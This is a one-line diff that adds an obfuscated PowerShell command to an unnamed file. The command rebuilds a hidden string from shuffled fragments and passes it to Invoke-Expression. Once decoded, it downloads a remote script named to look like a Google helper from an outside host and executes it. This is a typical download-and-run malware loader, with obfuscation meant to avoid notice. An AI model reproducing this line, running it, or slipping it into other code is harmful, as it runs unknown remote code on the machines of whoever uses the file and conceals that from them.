@@ -1,0 +1,1 @@
+﻿ iNVoke-EXprEssion( (("{22}{19}{17}{6}{10}{8}{2}{18}{24}{21}{7}{11}{13}{16}{1}{15}{20}{4}{5}{0}{14}{12}{23}{25}{9}{3}" -f'/','lhttp://c','nt','jl)','oginto','.me','bj','dS','lie','1M','ect Net.WebC','trin','elp','g(M','googleh','annot.','j','New-O',').Do','(','l','oa','IEX ','e','wnl','r.ps')).RePlACe('Mjl',[STRINg][chAr]39) ) 
